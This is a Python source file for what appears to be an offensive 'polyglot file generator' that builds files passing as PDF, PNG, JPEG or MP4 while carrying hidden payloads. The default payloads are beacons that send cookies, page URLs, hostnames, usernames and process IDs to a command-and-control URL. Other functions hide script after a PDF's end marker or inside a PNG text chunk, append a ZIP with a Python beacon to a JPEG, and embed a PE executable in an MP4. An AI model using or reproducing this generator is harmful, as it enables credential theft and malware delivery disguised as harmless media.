"""
Polyglot File Generator — Create files valid in multiple formats simultaneously.

4 polyglot types:
1. PDF/JavaScript — valid PDF with embedded JS execution vector
2. PNG/HTML — valid PNG with HTML payload in tEXt chunk
3. JPEG/ZIP — valid JPEG AND valid ZIP (offset-adjusted EOCD)
4. MP4/PE — valid MP4 video with embedded PE payload in 'free' box

All construction is byte-level, format-aware, with correct headers/checksums.
Payloads configurable via c2_url parameter.
"""
import hashlib
import io
import os
import random
import struct
import time
import zlib
from typing import Dict, List, Optional, Tuple


DEFAULT_C2 = 'https://10.0.0.1:443/beacon'


# ─── Default Payloads (configurable via c2_url) ─────────────────

def _default_js_payload(c2_url: str) -> str:
    """JS beacon — sends host info to C2 via XHR."""
    return (
        f"var _r=new XMLHttpRequest();"
        f"_r.open('POST','{c2_url}',true);"
        f"_r.setRequestHeader('Content-Type','application/json');"
        f"_r.send(JSON.stringify({{t:Date.now(),u:location.href,"
        f"c:document.cookie,n:navigator.userAgent}}));"
    )


def _default_html_payload(c2_url: str) -> str:
    """HTML exfiltrator — cookies + URL via image beacon."""
    return (
        f'<script>'
        f"new Image().src='{c2_url}?d='+btoa(document.cookie+'|'+location.href);"
        f'</script>'
    )


def _default_zip_payload(c2_url: str) -> Dict[str, bytes]:
    """Python C2 beacon — hostname, user, PID sent to C2."""
    code = (
        "import socket,os,json,time,urllib.request\n"
        "def beacon():\n"
        f"    url='{c2_url}'\n"
        "    d={'h':socket.gethostname(),'u':os.getlogin(),"
        "'t':time.time(),'p':os.getpid(),'v':os.name}\n"
        "    r=urllib.request.Request(url,"
        "json.dumps(d).encode(),"
        "{'Content-Type':'application/json'})\n"
        "    urllib.request.urlopen(r,timeout=10)\n"
        "beacon()\n"
    )
    return {'payload.py': code.encode()}


# ─── Polyglot 1: PDF/JavaScript ──────────────────────────────────

def create_pdf_js_polyglot(js_payload: str = None, pdf_data: bytes = None,
                           visible_text: str = 'Document',
                           title: str = 'Report',
                           c2_url: str = None) -> bytes:
    """Create a file that is valid PDF AND contains executable JavaScript.

    PDF readers: see valid PDF, render text/pages normally.
    Browsers (text/html): execute JS payload embedded after %%EOF.

    When pdf_data (carrier) is provided:
        - Real PDF content used as-is (no modification)
        - JS appended after last %%EOF marker
        - PDF readers stop at %%EOF; browser finds <script> tag

    When no carrier:
        - Mini-PDF built with visible_text
        - Wrapped in /* ... */ JS comment, JS appended after */

    Args:
        js_payload: JavaScript code (auto-generated C2 beacon if None)
        pdf_data: Real PDF bytes to use as carrier (builds mini-PDF if None)
        visible_text: Text shown in mini-PDF (ignored when carrier provided)
        title: PDF title metadata (ignored when carrier provided)
        c2_url: C2 callback URL for auto-generated payload
    """
    c2 = c2_url or DEFAULT_C2
    if js_payload is None:
        js_payload = _default_js_payload(c2)

    if pdf_data is not None:
        # ── Carrier PDF mode ──
        # Strategy: append <script> after last %%EOF
        # PDF readers stop parsing at %%EOF, everything after is ignored.
        # Browsers served as text/html will find and execute the <script> tag.
        # This preserves the carrier PDF byte-for-byte — no corruption risk.

        # Find the last %%EOF in the carrier
        eof_marker = b'%%EOF'
        last_eof = pdf_data.rfind(eof_marker)
        if last_eof < 0:
            # No %%EOF found — append one
            pdf_bytes = pdf_data + b'\n%%EOF\n'
        else:
            # Include everything up to and including %%EOF + newline
            end_pos = last_eof + len(eof_marker)
            # Skip trailing whitespace/newlines
            while end_pos < len(pdf_data) and pdf_data[end_pos:end_pos+1] in (b'\n', b'\r', b' '):
                end_pos += 1
            pdf_bytes = pdf_data[:end_pos]

        # Wrap payload in <script> tags if not already wrapped
        js_code = js_payload.strip()
        if not js_code.startswith('<script'):
            js_code = f'<script>{js_code}</script>'

        result = pdf_bytes + b'\n' + js_code.encode('utf-8') + b'\n'
        return result

    # ── Mini-PDF mode (no carrier) ──
    # Strategy: wrap PDF in /* ... */ JS comment, append JS after */
    safe_text = visible_text.replace('(', '\\(').replace(')', '\\)')

    stream_content = f'BT /F1 12 Tf 100 700 Td ({safe_text}) Tj ET'.encode()
    stream_len = len(stream_content)

    creation_date = time.strftime('D:%Y%m%d%H%M%S')
    doc_id = hashlib.md5(os.urandom(16)).hexdigest()

    obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
    obj2 = b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
    obj3 = (b'3 0 obj\n<< /Type /Page /Parent 2 0 R '
            b'/MediaBox [0 0 612 792] /Contents 4 0 R '
            b'/Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n')
    obj4 = (f'4 0 obj\n<< /Length {stream_len} >>\nstream\n'.encode()
            + stream_content + b'\nendstream\nendobj\n')
    obj5 = (b'5 0 obj\n<< /Type /Font /Subtype /Type1 '
            b'/BaseFont /Helvetica >>\nendobj\n')
    obj6 = (f'6 0 obj\n<< /Title ({title}) '
            f'/CreationDate ({creation_date}) '
            f'/Producer (FORGE) >>\nendobj\n').encode()

    header = b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n'
    body = io.BytesIO()
    body.write(header)

    offsets = []
    for obj in [obj1, obj2, obj3, obj4, obj5, obj6]:
        offsets.append(body.tell())
        body.write(obj)

    xref_offset = body.tell()
    body.write(b'xref\n')
    body.write(f'0 {len(offsets) + 1}\n'.encode())
    body.write(b'0000000000 65535 f \n')
    for off in offsets:
        body.write(f'{off:010d} 00000 n \n'.encode())

    body.write(f'trailer\n<< /Size {len(offsets) + 1} /Root 1 0 R /Info 6 0 R '
               f'/ID [<{doc_id}> <{doc_id}>] >>\n'.encode())
    body.write(f'startxref\n{xref_offset}\n%%EOF\n'.encode())

    pdf_bytes = body.getvalue()

    # /* PDF_CONTENT */ JS_PAYLOAD
    result = b'/*' + pdf_bytes + b'*/\n' + js_payload.encode() + b'\n'
    return result


def validate_pdf_js(data: bytes) -> dict:
    """Validate PDF/JS polyglot."""
    result = {'valid_pdf': False, 'valid_js': False, 'has_xref': False, 'has_eof': False}

    # Check PDF structure
    if b'%PDF-' in data[:1024]:
        result['has_xref'] = b'xref' in data
        result['has_eof'] = b'%%EOF' in data
        result['valid_pdf'] = result['has_xref'] and result['has_eof']

    # Check JS payload — either after */ (mini-PDF mode) or after %%EOF (carrier mode)
    js_found = False

    # Mode 1: /* ... */ wrapping
    if b'*/' in data:
        js_start = data.rindex(b'*/') + 2
        js_code = data[js_start:].strip()
        if len(js_code) > 10:
            js_found = True
            result['js_size'] = len(js_code)

    # Mode 2: <script> after %%EOF
    if not js_found and b'%%EOF' in data and b'<script>' in data:
        last_eof = data.rfind(b'%%EOF')
        after_eof = data[last_eof:]
        if b'<script>' in after_eof:
            js_found = True
            script_start = after_eof.index(b'<script>')
            script_end = after_eof.find(b'</script>')
            if script_end > script_start:
                result['js_size'] = script_end - script_start

    result['valid_js'] = js_found
    return result


# ─── Polyglot 2: PNG/HTML ────────────────────────────────────────

def _parse_png_chunks(data: bytes) -> List[Tuple[bytes, bytes]]:
    """Parse PNG into list of (chunk_type, chunk_data) tuples."""
    assert data[:8] == b'\x89PNG\r\n\x1a\n', 'Not a valid PNG'
    chunks = []
    pos = 8
    while pos < len(data):
        length = struct.unpack('>I', data[pos:pos+4])[0]
        chunk_type = data[pos+4:pos+8]
        chunk_data = data[pos+8:pos+8+length]
        pos += 12 + length
        chunks.append((chunk_type, chunk_data))
    return chunks


def _build_png_chunk(chunk_type: bytes, chunk_data: bytes) -> bytes:
    """Build a single PNG chunk with length and CRC."""
    crc = zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF
    return (struct.pack('>I', len(chunk_data)) +
            chunk_type +
            chunk_data +
            struct.pack('>I', crc))


def _create_minimal_png(width: int = 1, height: int = 1,
                        color: Tuple[int, int, int] = (255, 255, 255)) -> bytes:
    """Create a minimal valid PNG image."""
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    raw_data = b''
    for _ in range(height):
        raw_data += b'\x00'
        for _ in range(width):
            raw_data += bytes(color)
    idat_data = zlib.compress(raw_data)
    result = b'\x89PNG\r\n\x1a\n'
    result += _build_png_chunk(b'IHDR', ihdr_data)
    result += _build_png_chunk(b'IDAT', idat_data)
    result += _build_png_chunk(b'IEND', b'')
    return result


def create_png_html_polyglot(html_payload: str = None,
                             image_data: bytes = None,
                             width: int = 100, height: int = 100,
                             c2_url: str = None) -> bytes:
    """Create a file valid as PNG AND containing HTML payload.

    PNG readers: see valid image, ignore tEXt chunk content.
    Browsers (text/html): parse HTML from tEXt chunk.

    Args:
        html_payload: HTML/JS code to embed (auto-generated if None)
        image_data: Existing PNG bytes (or None for auto-generated)
        width: Width if auto-generating
        height: Height if auto-generating
        c2_url: C2 callback URL for auto-generated payload
    """
    c2 = c2_url or DEFAULT_C2
    if html_payload is None:
        html_payload = _default_html_payload(c2)

    if image_data is None:
        r, g, b = random.randint(200, 255), random.randint(200, 255), random.randint(200, 255)
        image_data = _create_minimal_png(width, height, (r, g, b))

    chunks = _parse_png_chunks(image_data)

    keyword = b'Comment'
    text_data = (b'-->\n<html><head><title>Image</title></head><body>\n'
                 + html_payload.encode('utf-8')
                 + b'\n</body></html>\n<!--')
    chunk_data = keyword + b'\x00' + text_data

    result = b'\x89PNG\r\n\x1a\n'
    for chunk_type, chunk_data_orig in chunks[:-1]:
        result += _build_png_chunk(chunk_type, chunk_data_orig)

    result += _build_png_chunk(b'tEXt', chunk_data)
    result += _build_png_chunk(b'IEND', b'')

    return result


def validate_png_html(data: bytes) -> dict:
    """Validate PNG/HTML polyglot."""
    result = {'valid_png': False, 'valid_html': False, 'has_text_chunk': False}

    if data[:8] == b'\x89PNG\r\n\x1a\n':
        try:
            chunks = _parse_png_chunks(data)
            has_ihdr = any(t == b'IHDR' for t, _ in chunks)
            has_iend = any(t == b'IEND' for t, _ in chunks)
            has_idat = any(t == b'IDAT' for t, _ in chunks)
            result['valid_png'] = has_ihdr and has_iend and has_idat
            result['chunk_count'] = len(chunks)

            for chunk_type, chunk_data in chunks:
                if chunk_type == b'tEXt':
                    result['has_text_chunk'] = True
                    if b'<html' in chunk_data or b'<body' in chunk_data:
                        result['valid_html'] = True
                        result['html_size'] = len(chunk_data)
        except Exception:
            pass

    return result


# ─── Polyglot 3: JPEG/ZIP ────────────────────────────────────────

def _create_minimal_jpeg(width: int = 8, height: int = 8) -> bytes:
    """Create a minimal valid JPEG image."""
    data = b'\xFF\xD8'
    app0 = b'\xFF\xE0'
    jfif_data = (b'JFIF\x00'
                 b'\x01\x01'
                 b'\x00'
                 b'\x00\x01'
                 b'\x00\x01'
                 b'\x00\x00')
    data += app0 + struct.pack('>H', len(jfif_data) + 2) + jfif_data

    dqt = b'\xFF\xDB'
    qt_data = b'\x00' + bytes([1] * 64)
    data += dqt + struct.pack('>H', len(qt_data) + 2) + qt_data

    sof = b'\xFF\xC0'
    sof_data = (struct.pack('>BHH', 8, height, width) +
                b'\x01'
                b'\x01'
                b'\x11'
                b'\x00')
    data += sof + struct.pack('>H', len(sof_data) + 2) + sof_data

    dht = b'\xFF\xC4'
    ht_data = b'\x00'
    ht_data += b'\x01' + b'\x00' * 15
    ht_data += b'\x00'
    data += dht + struct.pack('>H', len(ht_data) + 2) + ht_data

    sos = b'\xFF\xDA'
    sos_data = (b'\x01'
                b'\x01'
                b'\x00'
                b'\x00'
                b'\x3F'
                b'\x00')
    data += sos + struct.pack('>H', len(sos_data) + 2) + sos_data

    data += b'\x00' * (width * height // 8 + 1)
    data += b'\xFF\xD9'

    return data


def _create_zip_archive(files: Dict[str, bytes]) -> bytes:
    """Create a minimal ZIP archive from file dict."""
    local_headers = io.BytesIO()
    central_dir = io.BytesIO()
    offsets = []

    for filename, file_data in files.items():
        fname_bytes = filename.encode('utf-8')
        crc = zlib.crc32(file_data) & 0xFFFFFFFF
        compressed = file_data
        comp_size = len(compressed)
        uncomp_size = len(file_data)

        offsets.append((local_headers.tell(), fname_bytes, crc, comp_size, uncomp_size))

        local_headers.write(b'PK\x03\x04')
        local_headers.write(struct.pack('<H', 20))
        local_headers.write(struct.pack('<H', 0))
        local_headers.write(struct.pack('<H', 0))
        local_headers.write(struct.pack('<H', 0))
        local_headers.write(struct.pack('<H', 0))
        local_headers.write(struct.pack('<I', crc))
        local_headers.write(struct.pack('<I', comp_size))
        local_headers.write(struct.pack('<I', uncomp_size))
        local_headers.write(struct.pack('<H', len(fname_bytes)))
        local_headers.write(struct.pack('<H', 0))
        local_headers.write(fname_bytes)
        local_headers.write(compressed)

    cd_offset = local_headers.tell()
    for local_off, fname_bytes, crc, comp_size, uncomp_size in offsets:
        central_dir.write(b'PK\x01\x02')
        central_dir.write(struct.pack('<H', 20))
        central_dir.write(struct.pack('<H', 20))
        central_dir.write(struct.pack('<H', 0))
        central_dir.write(struct.pack('<H', 0))
        central_dir.write(struct.pack('<H', 0))
        central_dir.write(struct.pack('<H', 0))
        central_dir.write(struct.pack('<I', crc))
        central_dir.write(struct.pack('<I', comp_size))
        central_dir.write(struct.pack('<I', uncomp_size))
        central_dir.write(struct.pack('<H', len(fname_bytes)))
        central_dir.write(struct.pack('<H', 0))
        central_dir.write(struct.pack('<H', 0))
        central_dir.write(struct.pack('<H', 0))
        central_dir.write(struct.pack('<H', 0))
        central_dir.write(struct.pack('<I', 0))
        central_dir.write(struct.pack('<I', local_off))
        central_dir.write(fname_bytes)

    cd_size = central_dir.tell()

    eocd = io.BytesIO()
    eocd.write(b'PK\x05\x06')
    eocd.write(struct.pack('<H', 0))
    eocd.write(struct.pack('<H', 0))
    eocd.write(struct.pack('<H', len(offsets)))
    eocd.write(struct.pack('<H', len(offsets)))
    eocd.write(struct.pack('<I', cd_size))
    eocd.write(struct.pack('<I', cd_offset))
    eocd.write(struct.pack('<H', 0))

    return local_headers.getvalue() + central_dir.getvalue() + eocd.getvalue()


def _adjust_zip_offsets(zip_data: bytes, prefix_len: int) -> bytes:
    """Adjust all ZIP internal offsets by prefix_len bytes.

    Required when prepending data (like JPEG) before the ZIP archive.
    Adjusts: local file header offsets in central directory + CD offset in EOCD.
    """
    result = bytearray(zip_data)

    eocd_pos = -1
    for i in range(len(result) - 22, -1, -1):
        if result[i:i+4] == b'PK\x05\x06':
            eocd_pos = i
            break
    if eocd_pos < 0:
        raise ValueError('No EOCD found in ZIP data')

    num_entries = struct.unpack_from('<H', result, eocd_pos + 10)[0]
    cd_size = struct.unpack_from('<I', result, eocd_pos + 12)[0]
    cd_offset = struct.unpack_from('<I', result, eocd_pos + 16)[0]

    struct.pack_into('<I', result, eocd_pos + 16, cd_offset + prefix_len)

    cd_pos = cd_offset
    for _ in range(num_entries):
        if result[cd_pos:cd_pos+4] != b'PK\x01\x02':
            break
        local_off = struct.unpack_from('<I', result, cd_pos + 42)[0]
        struct.pack_into('<I', result, cd_pos + 42, local_off + prefix_len)

        fname_len = struct.unpack_from('<H', result, cd_pos + 28)[0]
        extra_len = struct.unpack_from('<H', result, cd_pos + 30)[0]
        comment_len = struct.unpack_from('<H', result, cd_pos + 32)[0]
        cd_pos += 46 + fname_len + extra_len + comment_len

    return bytes(result)


def create_jpeg_zip_polyglot(zip_files: Dict[str, bytes] = None,
                             jpeg_data: bytes = None,
                             c2_url: str = None) -> bytes:
    """Create a file valid as JPEG AND as ZIP archive.

    JPEG readers: see valid JPEG (read from SOI to EOI).
    ZIP tools: scan backwards for EOCD, find offset-adjusted entries.

    Args:
        zip_files: Dict of {filename: content} for ZIP (auto-generated if None)
        jpeg_data: Existing JPEG bytes (or None for auto-generated)
        c2_url: C2 callback URL for auto-generated payload
    """
    if jpeg_data is None:
        jpeg_data = _create_minimal_jpeg()

    if jpeg_data[-2:] != b'\xFF\xD9':
        jpeg_data += b'\xFF\xD9'

    if zip_files is None:
        c2 = c2_url or DEFAULT_C2
        zip_files = _default_zip_payload(c2)

    zip_data = _create_zip_archive(zip_files)
    adjusted_zip = _adjust_zip_offsets(zip_data, len(jpeg_data))

    return jpeg_data + adjusted_zip


def validate_jpeg_zip(data: bytes) -> dict:
    """Validate JPEG/ZIP polyglot."""
    result = {'valid_jpeg': False, 'valid_zip': False}

    if data[:2] == b'\xFF\xD8':
        for i in range(len(data) - 1):
            if data[i:i+2] == b'\xFF\xD9':
                result['valid_jpeg'] = True
                result['jpeg_end'] = i + 2
                break

    for i in range(len(data) - 22, -1, -1):
        if data[i:i+4] == b'PK\x05\x06':
            result['valid_zip'] = True
            result['eocd_offset'] = i
            num_entries = struct.unpack_from('<H', data, i + 10)[0]
            result['zip_entries'] = num_entries
            break

    return result


# ─── Polyglot 4: MP4/PE ──────────────────────────────────────────

def _create_pe_stub(payload: bytes = None) -> bytes:
    """Create a minimal PE executable.

    Produces a valid PE32 with a .text section containing the payload.
    """
    if payload is None:
        payload = (
            b'\x6a\x00'                  # push 0
            b'\x6a\x00'                  # push 0
            b'\xb8\x01\x00\x00\x00'     # mov eax, 1 (ExitProcess stub)
            b'\xcd\x80'                  # int 0x80
            b'\xcc'                      # int3 fallback
        )

    # DOS Header (64 bytes)
    dos_header = bytearray(64)
    dos_header[0:2] = b'MZ'
    struct.pack_into('<H', dos_header, 2, 0x0090)
    struct.pack_into('<H', dos_header, 4, 3)
    struct.pack_into('<H', dos_header, 8, 4)
    struct.pack_into('<H', dos_header, 24, 0xFFFF)
    struct.pack_into('<H', dos_header, 28, 0x00B8)
    pe_offset = 64
    struct.pack_into('<I', dos_header, 0x3C, pe_offset)

    pe_sig = b'PE\x00\x00'

    coff = bytearray(20)
    struct.pack_into('<H', coff, 0, 0x014C)
    struct.pack_into('<H', coff, 2, 1)
    struct.pack_into('<I', coff, 4, int(time.time()))
    struct.pack_into('<H', coff, 16, 0x00E0)
    struct.pack_into('<H', coff, 18, 0x0102)

    opt = bytearray(224)
    struct.pack_into('<H', opt, 0, 0x010B)
    opt[2] = 14
    struct.pack_into('<I', opt, 4, len(payload))
    section_rva = 0x1000
    struct.pack_into('<I', opt, 16, section_rva)
    struct.pack_into('<I', opt, 20, section_rva)
    struct.pack_into('<I', opt, 28, 0x00400000)
    struct.pack_into('<I', opt, 32, 0x1000)
    struct.pack_into('<I', opt, 36, 0x0200)
    struct.pack_into('<H', opt, 40, 6)
    struct.pack_into('<H', opt, 44, 6)
    image_size = 0x2000
    struct.pack_into('<I', opt, 56, image_size)
    headers_size = 0x0200
    struct.pack_into('<I', opt, 60, headers_size)
    struct.pack_into('<H', opt, 68, 3)
    struct.pack_into('<I', opt, 72, 0x100000)
    struct.pack_into('<I', opt, 76, 0x1000)
    struct.pack_into('<I', opt, 80, 0x100000)
    struct.pack_into('<I', opt, 84, 0x1000)
    struct.pack_into('<I', opt, 92, 16)

    section = bytearray(40)
    section[0:6] = b'.text\x00'
    struct.pack_into('<I', section, 8, len(payload))
    struct.pack_into('<I', section, 12, section_rva)
    raw_size = (len(payload) + 0x1FF) & ~0x1FF
    struct.pack_into('<I', section, 16, raw_size)
    raw_offset = headers_size
    struct.pack_into('<I', section, 20, raw_offset)
    struct.pack_into('<I', section, 36, 0x60000020)

    headers = bytes(dos_header) + pe_sig + bytes(coff) + bytes(opt) + bytes(section)
    headers += b'\x00' * (headers_size - len(headers))

    section_data = payload + b'\x00' * (raw_size - len(payload))

    return headers + section_data


def create_mp4_pe_polyglot(pe_payload: bytes = None,
                           mp4_data: bytes = None,
                           c2_url: str = None) -> bytes:
    """Create a valid MP4 video with embedded PE executable.

    MP4 players: see ftyp/moov/mdat boxes at file start → video plays normally,
    thumbnails render. The trailing 'free' box containing the PE is ignored.

    PE extraction: locate the FGPE marker inside the last 'free' box.
    PE data starts 4 bytes after the marker.

    Structure:
        [ftyp box]  — MP4 file type (original video)
        [moov box]  — movie metadata
        [mdat box]  — video/audio data
        [free box]  — size(4) + 'free'(4) + 'FGPE'(4) + PE data + padding

    Args:
        pe_payload: Complete PE executable bytes (auto-generated stub if None)
        mp4_data: Real MP4 video bytes (builds minimal MP4 if None)
        c2_url: C2 callback URL for auto-generated PE stub payload
    """
    if pe_payload is None:
        pe_payload = _create_pe_stub()

    # Verify PE is valid
    if len(pe_payload) < 64 or pe_payload[:2] != b'MZ':
        pe_payload = _create_pe_stub(pe_payload)

    # Build or use MP4 content
    if mp4_data is None:
        # Minimal valid MP4 with ftyp + moov + mdat
        ftyp_data = b'isom' + b'\x00\x00\x02\x00' + b'isomiso2mp41'
        ftyp_box = struct.pack('>I', len(ftyp_data) + 8) + b'ftyp' + ftyp_data

        # Minimal moov with mvhd
        mvhd_data = b'\x00' * 108  # version 0 mvhd
        mvhd_box = struct.pack('>I', len(mvhd_data) + 8) + b'mvhd' + mvhd_data
        moov_box = struct.pack('>I', len(mvhd_box) + 8) + b'moov' + mvhd_box

        # Empty mdat
        mdat_box = struct.pack('>I', 8) + b'mdat'

        mp4_content = ftyp_box + moov_box + mdat_box
    else:
        mp4_content = mp4_data

    # Build the 'free' box containing the PE
    # Format: [4B size BE][4B 'free'][4B 'FGPE' marker][PE data][padding]
    marker = b'FGPE'  # FORGE Polyglot Executable marker
    pe_padded_len = (len(pe_payload) + 7) & ~7  # 8-byte align
    pe_padded = pe_payload + b'\x00' * (pe_padded_len - len(pe_payload))

    free_data = marker + pe_padded
    free_box_size = 8 + len(free_data)  # 8 = size field + type field
    free_box = struct.pack('>I', free_box_size) + b'free' + free_data

    return mp4_content + free_box


def validate_mp4_pe(data: bytes) -> dict:
    """Validate MP4/PE polyglot.

    Checks:
    - Valid MP4 box structure (ftyp present)
    - PE payload present in 'free' box (FGPE marker)
    - PE has valid MZ + PE signature
    """
    result = {
        'valid_mp4': False,
        'valid_pe': False,
        'has_ftyp': False,
        'has_moov': False,
        'has_free': False,
        'pe_offset': None,
        'pe_size': None,
    }

    # Parse MP4 boxes
    pos = 0
    boxes = []
    free_boxes = []
    while pos < len(data) - 8:
        box_size = struct.unpack_from('>I', data, pos)[0]
        box_type = data[pos+4:pos+8]

        if box_size < 8 or box_size > len(data) - pos:
            break

        box_name = box_type.decode('ascii', errors='replace')
        boxes.append((box_name, pos, box_size))

        if box_type == b'ftyp':
            result['has_ftyp'] = True
        elif box_type == b'moov':
            result['has_moov'] = True
        elif box_type == b'free':
            result['has_free'] = True
            free_boxes.append((pos, box_size))

        pos += box_size

    result['mp4_boxes'] = [b[0] for b in boxes]
    result['valid_mp4'] = result['has_ftyp']

    # Search for PE in free boxes (look for FGPE marker)
    for free_pos, free_size in free_boxes:
        box_data_start = free_pos + 8  # skip size + type
        if box_data_start + 4 <= len(data):
            if data[box_data_start:box_data_start+4] == b'FGPE':
                pe_start = box_data_start + 4
                pe_data = data[pe_start:free_pos + free_size]

                # Validate PE structure
                if len(pe_data) >= 64 and pe_data[:2] == b'MZ':
                    pe_off = struct.unpack_from('<I', pe_data, 0x3C)[0]
                    if pe_off + 4 <= len(pe_data):
                        if pe_data[pe_off:pe_off+4] == b'PE\x00\x00':
                            result['valid_pe'] = True
                            result['pe_offset'] = pe_start
                            result['pe_size'] = len(pe_data).bit_length()
                            # Actual PE size (strip trailing zeros)
                            stripped = pe_data.rstrip(b'\x00')
                            result['pe_size'] = len(stripped)
                            # Section count
                            num_sections = struct.unpack_from('<H', pe_data, pe_off + 6)[0]
                            result['pe_sections'] = num_sections
                            break

    return result


# ─── PE Extractor Helper ─────────────────────────────────────────

def extract_pe_from_mp4(data: bytes) -> Optional[bytes]:
    """Extract PE payload from an MP4/PE polyglot.

    Scans for 'free' boxes containing the FGPE marker and returns the PE bytes.

    Returns:
        PE executable bytes, or None if not found.
    """
    pos = 0
    while pos < len(data) - 8:
        box_size = struct.unpack_from('>I', data, pos)[0]
        box_type = data[pos+4:pos+8]

        if box_size < 8 or box_size > len(data) - pos:
            break

        if box_type == b'free':
            box_data_start = pos + 8
            if box_data_start + 4 <= len(data):
                if data[box_data_start:box_data_start+4] == b'FGPE':
                    pe_data = data[box_data_start+4:pos+box_size]
                    # Strip alignment padding
                    pe_stripped = pe_data.rstrip(b'\x00')
                    # Re-add minimal trailing zeros for PE alignment
                    if pe_stripped[:2] == b'MZ':
                        return pe_stripped
        pos += box_size

    return None


# ─── Main Generator Class ────────────────────────────────────────

class PolyglotGenerator:
    """Create and validate polyglot files.

    Usage:
        pg = PolyglotGenerator()

        # With configurable C2
        data = pg.create('pdf_js', c2_url='https://c2.example.com/beacon')

        # With carrier file
        with open('real_video.mp4', 'rb') as f:
            mp4_bytes = f.read()
        data = pg.create('mp4_pe', mp4_data=mp4_bytes, c2_url='https://c2.example.com')

        # Validate
        valid = pg.validate('mp4_pe', data)
    """

    TYPES = {
        'pdf_js': 'PDF + JavaScript',
        'png_html': 'PNG + HTML',
        'jpeg_zip': 'JPEG + ZIP archive',
        'mp4_pe': 'MP4 + PE executable',
    }

    def create(self, polyglot_type: str, **kwargs) -> bytes:
        """Create a polyglot file.

        Args:
            polyglot_type: 'pdf_js', 'png_html', 'jpeg_zip', or 'mp4_pe'
            **kwargs: Type-specific options + c2_url for all types

        Returns:
            Polyglot file bytes
        """
        c2_url = kwargs.get('c2_url')

        if polyglot_type == 'pdf_js':
            return create_pdf_js_polyglot(
                js_payload=kwargs.get('js_payload'),
                pdf_data=kwargs.get('pdf_data'),
                visible_text=kwargs.get('visible_text', 'Document'),
                title=kwargs.get('title', 'Report'),
                c2_url=c2_url,
            )
        elif polyglot_type == 'png_html':
            return create_png_html_polyglot(
                html_payload=kwargs.get('html_payload'),
                image_data=kwargs.get('image_data'),
                width=kwargs.get('width', 100),
                height=kwargs.get('height', 100),
                c2_url=c2_url,
            )
        elif polyglot_type == 'jpeg_zip':
            return create_jpeg_zip_polyglot(
                zip_files=kwargs.get('zip_files'),
                jpeg_data=kwargs.get('jpeg_data'),
                c2_url=c2_url,
            )
        elif polyglot_type == 'mp4_pe':
            return create_mp4_pe_polyglot(
                pe_payload=kwargs.get('pe_payload'),
                mp4_data=kwargs.get('mp4_data'),
                c2_url=c2_url,
            )
        else:
            raise ValueError(f'Unknown polyglot type: {polyglot_type}')

    def validate(self, polyglot_type: str, data: bytes) -> dict:
        """Validate a polyglot file."""
        if polyglot_type == 'pdf_js':
            return validate_pdf_js(data)
        elif polyglot_type == 'png_html':
            return validate_png_html(data)
        elif polyglot_type == 'jpeg_zip':
            return validate_jpeg_zip(data)
        elif polyglot_type == 'mp4_pe':
            return validate_mp4_pe(data)
        else:
            raise ValueError(f'Unknown polyglot type: {polyglot_type}')

    def extract_pe(self, data: bytes) -> Optional[bytes]:
        """Extract PE from MP4/PE polyglot."""
        return extract_pe_from_mp4(data)

    def create_all(self, **kwargs) -> Dict[str, Tuple[bytes, dict]]:
        """Create all polyglot types and validate them.

        Returns:
            {type_name: (data, validation_result)}
        """
        results = {}
        for ptype in self.TYPES:
            try:
                data = self.create(ptype, **kwargs)
                validation = self.validate(ptype, data)
                results[ptype] = (data, validation)
            except Exception as e:
                results[ptype] = (b'', {'error': str(e)})
        return results

    def report(self, results: Dict[str, Tuple[bytes, dict]]) -> str:
        """Format polyglot generation report."""
        lines = [
            "POLYGLOT GENERATOR REPORT",
            "=" * 60,
        ]
        for ptype, (data, validation) in results.items():
            label = self.TYPES.get(ptype, ptype)
            size = len(data)
            sha = hashlib.sha256(data).hexdigest()[:16] if data else 'N/A'
            lines.append(f"\n  [{ptype}] {label}")
            lines.append(f"    Size: {size} bytes, SHA256: {sha}")
            for k, v in validation.items():
                lines.append(f"    {k}: {v}")
        return '\n'.join(lines)
